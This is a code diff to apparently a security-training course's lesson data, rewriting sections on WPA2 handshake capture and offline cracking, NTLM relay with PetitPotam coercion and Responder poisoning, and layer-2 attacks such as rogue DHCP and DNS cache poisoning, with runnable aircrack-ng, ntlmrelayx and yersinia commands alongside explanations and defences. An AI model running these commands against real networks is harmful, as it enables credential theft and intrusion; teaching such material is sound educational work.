@@ -392,7 +392,18 @@ airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
 
 # Deauth to force reconnection (capture handshake)
 aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
-\`\`\``,
+\`\`\`
+
+**Why this sequence works.** When a client joins a WPA2 network it runs a **4-way handshake** with the access point to prove both sides know the passphrase and to derive fresh session keys. The passphrase itself is never sent — the handshake exchanges nonces and a MIC (message integrity code) *derived* from it. Capturing those four frames gives an attacker everything needed to test guesses **offline**: hash a candidate passphrase into the pairwise key, recompute the MIC, and compare. The **deauth** frame is the catalyst — it forcibly disconnects the client, which immediately reconnects and replays the handshake while you are listening.
+
+\`\`\`bash
+# Crack the captured handshake entirely offline
+aircrack-ng -w rockyou.txt capture-01.cap
+\`\`\`
+
+This is also why WPA3 matters: its **SAE** handshake (Dragonfly) is designed to resist offline dictionary attacks, so a captured exchange no longer lets you test guesses at leisure.
+
+Source: IEEE 802.11i (4-way handshake); Mathy Vanhoef, "KRACK" (2017) and "Dragonblood" (2019); aircrack-ng documentation.`,
         sortOrder: 3,
       },
       {
@@ -1044,23 +1055,40 @@ Password spraying (one password, many users) avoids lockout policies. Use known 
       },
       {
         heading: "Relay and coercion attacks",
-        content: `Relay attacks forward authentication attempts to a different service:
+        content: `Relay attacks forward a victim's authentication to a *different* service, letting the attacker authenticate **as the victim** without ever knowing their password.
 
-\`\`\`bash
-# NTLM relay with Impacket
-# Listen for incoming NTLM auth and relay to target
-ntlmrelayx.py -tf targets.txt -smb2support
+**Why it works.** NTLM authentication is a challenge-response that is **not bound to the connection it happens on**. The attacker sits in the middle: when the victim authenticates to the attacker, the attacker forwards each message to a *third* target and passes the target's challenge back to the victim. The victim dutifully signs it with their credentials, and the attacker relays the valid response onward — authenticating to the target as the victim. Nothing is cracked; a legitimate response is simply delivered somewhere it was never meant to go.
 
-# Coerce authentication with PetitPotam
-python3 PetitPotam.py ATTACKER_IP DC_IP
-
-# Responder — capture/relay NetNTLM hashes
-responder -I eth0 -wrf
-# Poisons LLMNR/NBT-NS/mDNS responses
-# Captures NTLMv2 hashes when hosts try to authenticate
+\`\`\`mermaid
+sequenceDiagram
+    participant V as Victim
+    participant A as Attacker (relay)
+    participant T as Target server
+    V->>A: NTLM negotiate (coerced / poisoned)
+    A->>T: NTLM negotiate (as victim)
+    T->>A: Challenge
+    A->>V: Challenge (forwarded)
+    V->>A: Response (signed with victim creds)
+    A->>T: Response (relayed)
+    Note over A,T: Attacker is now authenticated as the victim
 \`\`\`
 
-Defense: disable LLMNR and NBT-NS, enable SMB signing, use EPA (Extended Protection for Authentication).`,
+Two ingredients make it practical: **coercion** (force a victim — often a server or DC — to authenticate to you, e.g. PetitPotam) and **poisoning** (answer LLMNR/NBT-NS name lookups so hosts authenticate to you by mistake).
+
+\`\`\`bash
+# Relay incoming NTLM auth to a chosen target
+ntlmrelayx.py -tf targets.txt -smb2support
+
+# Coerce a target into authenticating to us
+python3 PetitPotam.py ATTACKER_IP DC_IP
+
+# Poison LLMNR/NBT-NS/mDNS to capture or relay NetNTLM hashes
+responder -I eth0 -wrf
+\`\`\`
+
+**Defense — and why it works.** **SMB signing** cryptographically binds each message to the session, so a relayed response fails the signature check. **EPA** (Extended Protection for Authentication) binds the NTLM exchange to the outer TLS channel, defeating relay to HTTPS endpoints. Disabling LLMNR/NBT-NS removes the poisoning foothold. This is the same "the response can be forwarded" weakness that underlies Pass-the-Hash — see the ad-fundamentals track.
+
+Source: MITRE ATT&CK T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay); Microsoft guidance on mitigating NTLM relay; Impacket and Responder documentation.`,
         sortOrder: 3,
       },
       {
@@ -1158,27 +1186,22 @@ The mitm6 + ntlmrelayx combination is highly effective in environments where IPv
       },
       {
         heading: "Protocol-level attacks",
-        content: `Attacks targeting protocol weaknesses:
+        content: `These attacks share one root weakness: layer-2 and early protocols were built to trust anything on the wire, with no authentication. Each turns that trust into a redirect or a spoof.
+
+**VLAN hopping (double tagging).** The attacker crafts a frame with an *outer* 802.1Q tag matching the switch's native VLAN and an *inner* tag for the victim VLAN. The first switch strips the outer tag (native-VLAN traffic is sent untagged) and forwards the frame with the inner tag still attached — landing it in a VLAN the attacker was never allowed into. It is one-way (no return path), but enough to inject spoofed traffic.
+
+**STP root-bridge takeover.** Spanning Tree elects the switch with the lowest priority as the "root", and every switch steers traffic toward it. Announce yourself with priority 0 (a forged BPDU) and traffic reroutes through your machine — a layer-2 man-in-the-middle.
+
+**DHCP starvation + rogue DHCP.** Flood the real DHCP server with requests from fake MAC addresses until its address pool is exhausted; your own rogue DHCP server then answers new clients, handing out *your* IP as their default gateway — MitM by configuration.
+
+**DNS cache poisoning (Kaminsky).** A resolver caches whichever answer arrives first for a query. The attacker triggers lookups for many random subdomains and floods forged responses guessing the 16-bit transaction ID; win the race once and a poisoned record (e.g. a spoofed nameserver for the whole domain) is cached for every downstream user. Source-port randomization is the fix — it widened the effective ID space enough to make the race impractical.
 
 \`\`\`bash
-# VLAN hopping via double tagging
-# Craft double-tagged 802.1Q frames
-# Requires: native VLAN matches outer tag, switch forwards inner tag
-
-# STP manipulation
-# Announce yourself as root bridge to redirect traffic
-# yersinia -I eth0 -G  (STP attack mode)
-
-# DHCP starvation + rogue DHCP
-# Exhaust legitimate pool, then serve rogue DHCP with our gateway
-# yersinia -I eth0 -G  (DHCP attack mode)
-
-# DNS cache poisoning
-# Race the legitimate DNS server to respond with forged answers
-# Kaminsky attack: query random subdomains, blast forged responses
+# yersinia drives most layer-2 attacks (STP, DHCP, 802.1Q, CDP)
+yersinia -I eth0 -G           # interactive GUI mode
 \`\`\`
 
-These attacks target the trust assumptions in network protocols — most were designed without authentication.`,
+Source: IEEE 802.1Q / 802.1D; Dan Kaminsky, "Black Ops 2008" (DNS cache poisoning); RFC 5452 (DNS resilience to forged answers).`,
         sortOrder: 2,
       },
       {
